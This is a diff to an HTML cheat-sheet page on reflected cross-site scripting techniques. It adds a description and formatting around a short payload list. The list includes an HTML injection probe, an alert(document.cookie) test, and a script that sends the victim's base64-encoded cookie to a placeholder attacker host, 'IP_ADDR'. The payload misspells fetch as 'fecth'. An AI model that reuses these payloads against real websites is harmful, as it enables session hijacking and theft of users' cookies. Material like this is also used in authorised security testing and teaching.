@@ -88,9 +88,10 @@
 <pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <details>
 <summary>REFLECTED TECHNIQUES</summary>
-<p>DESCRIPTION:  </p>
+<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
+information, stole information, etc. </p>
 <p>
-COMMON TESTS:
+<b>COMMON TESTS:</b>
 
 &lt;h1&gt;TEST&lt;/h1&gt; || NORMAL TEST TO KNOW IF VULNERABILITY EXIST</blockquote>
 	
@@ -98,9 +99,12 @@ COMMON TESTS:
 
 &lt;script&gt;alert(document.cookie);&lt;/script&gt; || NORMAL TEST TO RETRIEVE COOKIES
 
-&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt; || STOLE ENCODED BASE64 COOKIE, SENT TO ATTACKER MACHINE
+&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt; || STOLE ENCODED BASE64 COOKIE
 *for this to work, it is needed a python server or any listener to retrieve the content.
 
+
+
+	
 </p>
 </details>
 <details>
